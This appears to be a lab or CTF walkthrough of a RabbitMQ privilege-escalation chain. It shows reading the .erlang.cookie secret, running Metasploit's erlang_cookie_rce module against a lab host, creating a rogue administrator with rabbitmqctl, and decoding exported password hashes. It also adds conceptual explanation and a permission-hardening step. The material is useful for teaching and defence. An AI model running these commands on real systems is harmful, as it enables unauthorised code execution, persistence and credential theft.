## Overview

RabbitMQ is an open-source message broker used by applications to exchange messages asynchronously.

It is written in Erlang and runs on the Erlang/OTP runtime. Because RabbitMQ uses Erlang's distributed-node functionality, Erlang nodes authenticate with a shared secret called the **Erlang cookie**.

If an attacker obtains a valid Erlang cookie and can reach the Erlang distribution port of a RabbitMQ server, they may be able to authenticate as a trusted Erlang node.

If the RabbitMQ service is running with elevated privileges, successful Erlang-level code execution can result in command execution with the privileges of the RabbitMQ service account.

The attack chain is therefore:

```text
RabbitMQ service
      │
      ├── Erlang/OTP
      │      │
      │      └── Erlang Cookie
      │
      ▼
Obtain .erlang.cookie
      │
      ▼
Authenticate to Erlang distribution
      │
      ▼
Erlang RCE
      │
      ▼
Command execution as RabbitMQ user
      │
      ▼
Further privilege escalation
````

---

## 1. Enumeration

### Identify RabbitMQ

First, check whether RabbitMQ is running:
```bash
ps aux | grep -i rabbitmq
```

or:
```bash
systemctl status rabbitmq-server
```

You can also search for RabbitMQ-related processes:
```bash
ps aux | grep -Ei 'rabbitmq|beam.smp'
```

`beam.smp` is the Erlang virtual machine process commonly used by RabbitMQ.

### Enumerate listening ports

RabbitMQ commonly exposes:

|Port|Purpose|
|---|---|
|5672|AMQP|
|15672|RabbitMQ Management HTTP API|
|25672|Erlang distribution / inter-node communication|
|4369|Erlang Port Mapper Daemon (EPMD)|

Enumerate them with:
```bash
nmap -sV -p- <TARGET>
```

Then specifically inspect the discovered ports:
```bash
nmap -sV -p 4369,5672,15672,25672 <TARGET>
```

### Important

Port `25672` is particularly interesting when investigating Erlang/RabbitMQ attacks because it is used for Erlang distribution.

Port `4369` is EPMD, which helps Erlang nodes discover the ports used by distributed Erlang services.

---

# 2. The Erlang Cookie

Erlang distributed applications use a shared secret called the **Erlang cookie**.

The cookie normally exists in:
```bash
/var/lib/rabbitmq/.erlang.cookie
```

On a compromised Linux machine:
```bash
cd /var/lib/rabbitmq
cat .erlang.cookie
```

Example:
```text
bDXRdeoPp9a9Acoi
```

The cookie is essentially a shared authentication secret between Erlang nodes.

It is important because knowing the cookie can allow an attacker to authenticate to the Erlang distribution interface.

### Cookie permissions

The cookie is normally expected to have restrictive permissions.

Check:
```bash
ls -la /var/lib/rabbitmq/.erlang.cookie
```

If necessary, permissions can be corrected with:
```bash
chmod 400 /var/lib/rabbitmq/.erlang.cookie
```

`400` means:
```text
Owner: read
Group: none
Others: none
```

The file should not be readable by unprivileged users.

---

# 3. Why the Cookie Is Dangerous

The Erlang cookie is **not the RabbitMQ user's password**.

Instead:
```text
RabbitMQ
   │
   └── Erlang/OTP
          │
          └── Distributed Erlang authentication
                    │
                    └── .erlang.cookie
```

A stolen cookie can potentially allow an attacker to impersonate a trusted Erlang node.

This becomes particularly dangerous when:
1. The cookie is readable by an unprivileged user.
2. Erlang distribution is reachable.
3. The attacker knows the target's Erlang node information.
4. The RabbitMQ/Erlang process has useful privileges.

---

# 4. Exploitation with Metasploit

Metasploit contains a module for abusing Erlang distribution:
```text
exploit/multi/misc/erlang_cookie_rce
```

Start Metasploit:
```bash
msfconsole
```

Select the module:
```text
use exploit/multi/misc/erlang_cookie_rce
```

Set the target:
```text
set RHOSTS 10.130.187.77
```

Set the Erlang distribution port:
```text
set RPORT 25672
```

Provide the stolen Erlang cookie:
```text
set COOKIE bDXRdeoPp9a9Acoi
```

Set the target:
```text
set TARGET 0
```

Then exploit:
```text
exploit
```

---

## 5. What Happens During the Exploit?

The important concept is that Metasploit is not simply "logging into RabbitMQ."

The attack abuses **distributed Erlang**.

Conceptually:
```text
Attacker
   │
   │ Erlang cookie
   ▼
Erlang Distribution
   │
   │ authentication
   ▼
RabbitMQ Erlang VM
   │
   │ malicious Erlang execution
   ▼
Command execution
```

The cookie allows the attacker to authenticate as a trusted Erlang node.

The Metasploit module then abuses the Erlang node's capabilities to achieve remote code execution.

If successful:
```text
whoami
```

may return:
```text
rabbitmq
```

This means the commands are being executed with the privileges of the RabbitMQ service account.

**This is not necessarily root yet.**

---

# 6. RabbitMQ User Enumeration

If you have legitimate RabbitMQ access, you can enumerate RabbitMQ users using:
```bash
rabbitmqctl list_users
```

Example:
```text
Listing users ...
user    tags
root    [administrator]
```

`rabbitmqctl` is RabbitMQ's command-line administration utility.

It communicates with the local RabbitMQ node and can perform administrative operations when executed with appropriate privileges.

---

# 7. Creating a RabbitMQ Administrator

If you have sufficient RabbitMQ administrative privileges, you can create a new user:
```bash
rabbitmqctl add_user 0xb0b 0xb0b
```

This creates:
```text
Username: 0xb0b
Password: 0xb0b
```

Grant the user permissions on the default virtual host:
```bash
rabbitmqctl set_permissions -p / 0xb0b ".*" ".*" ".*"
```

The three regular expressions correspond to:
```text
configure
write
read
```

So:
```text
".*"  ".*"  ".*"
```

grants unrestricted permissions within the `/` virtual host.

Then assign the administrator tag:
```bash
rabbitmqctl set_user_tags 0xb0b administrator
```

The user is now a RabbitMQ administrator.

---

# 8. Export RabbitMQ Definitions

RabbitMQ provides `rabbitmqadmin` for administration through the management API.

Export the RabbitMQ definitions:
```bash
rabbitmqadmin export rabbit.definitions.json -u 0xb0b -p 0xb0b
```

This creates:
```text
rabbit.definitions.json
```

Inspect it:
```bash
cat rabbit.definitions.json
```

or search for password-related information:
```bash
grep -i password rabbit.definitions.json
```

RabbitMQ stores passwords using a salted password-hash representation rather than plaintext passwords.

---

# 9. RabbitMQ Password Hash Format

A RabbitMQ password hash may look similar to:
```text
49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF
```

This is Base64-encoded data containing information used by RabbitMQ's password hashing mechanism.

The important distinction is:
```text
Erlang Cookie
        ≠
RabbitMQ Password Hash
```

The cookie authenticates Erlang nodes.

The RabbitMQ password hash is associated with RabbitMQ user authentication.

---

# 10. Decode the RabbitMQ Hash

Python can be used to decode the Base64 representation:
```python
import hashlib
import binascii

hash = '49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF'

def decode_rabbit_password_hash(password_hash):
    password_hash = binascii.a2b_base64(password_hash)
    decoded_hash = password_hash.hex()

    return decoded_hash[0:8], decoded_hash[8:]

print(decode_rabbit_password_hash(hash))
```

Run:
```bash
python3 file.py
```

The function performs two operations:
### 1. Base64 decoding
```python
binascii.a2b_base64(password_hash)
```
converts the Base64 string into its underlying bytes.
### 2. Hexadecimal representation
```python
password_hash.hex()
```
converts those bytes into hexadecimal.

The function then separates:
```python
decoded_hash[0:8]
```

from:
```python
decoded_hash[8:]
```

The first portion represents the salt portion used by the format, while the remaining bytes contain the derived password hash.

---

#  Privilege Escalation Chain

The complete attack path can be summarized as:

```text
1. Enumerate target
       │
       ▼
2. Discover RabbitMQ
       │
       ▼
3. Discover Erlang distribution
       │
       └── 25672
       │
       ▼
4. Find readable .erlang.cookie
       │
       ▼
5. Obtain Erlang cookie
       │
       ▼
6. Authenticate to Erlang distribution
       │
       ▼
7. Erlang RCE
       │
       ▼
8. Execute commands as rabbitmq
       │
       ▼
9. Enumerate RabbitMQ
       │
       ▼
10. Abuse administrative privileges
       │
       ▼
11. Continue toward root / higher privileges
```

---

# Important Notes

- RabbitMQ is a **message broker**, not an operating-system privilege escalation mechanism by itself.
    
- RabbitMQ commonly runs on top of **Erlang/OTP**.
    
- `.erlang.cookie` is an **Erlang authentication secret**.
    
- Port `25672` is important for Erlang distribution.
    
- Port `4369` is used by **EPMD**.
    
- A readable Erlang cookie can potentially lead to **remote code execution**.
    
- RCE as `rabbitmq` does **not automatically mean root**.
    
- `rabbitmqctl` requires appropriate privileges for administrative operations.
    
- RabbitMQ password hashes and Erlang cookies are **different credentials/secrets**.
    
- Restricting `.erlang.cookie` permissions is important because anyone who can read it may potentially abuse Erlang distribution.
    
- Exposing Erlang distribution ports to untrusted networks increases the attack surface.
    
The actual vulnerability/attack primitive is the **Erlang distribution authentication using the cookie**. RabbitMQ is the application running on Erlang, and the eventual privilege escalation depends on **what privileges the RabbitMQ/Erlang process has and what additional weaknesses exist**.
